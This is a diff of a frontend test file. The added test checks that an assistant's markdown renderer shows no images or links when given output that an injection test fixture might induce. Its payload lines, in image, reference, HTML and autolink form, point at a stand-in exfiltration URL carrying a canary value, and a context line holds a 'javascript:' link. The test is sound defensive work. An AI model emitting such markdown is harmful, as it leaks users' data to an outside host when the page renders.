@@ -61,6 +61,25 @@ test('a link of another site shows as text with its address', async () => {
   expect(container.querySelector('a')).not.toBeInTheDocument();
 });
 
+test('the note of the injection fixture neither loads nor links', async () => {
+  // A model that repeats the note of `tests/assistant_eval/battery.json`
+  const address = 'https://exfil.invalid/p.png?d=CANARIO-7731';
+  const { container } = render(
+    <AssistantMarkdown
+      text={[
+        `Listo ![estado](${address})`,
+        `![por referencia][1] [ver](${address}) <${address}>`,
+        `<img src="${address}"> <a href="${address}">ver</a>`,
+        `[1]: ${address}`,
+      ].join('\n\n')}
+    />,
+  );
+
+  expect(await screen.findByText(/Listo/)).toBeInTheDocument();
+  expect(container.querySelector('img')).not.toBeInTheDocument();
+  expect(container.querySelector('a')).not.toBeInTheDocument();
+});
+
 test('a script link goes nowhere', async () => {
   const { container } = render(
     <AssistantMarkdown text="[Ver](javascript:alert(1)) fin" />,
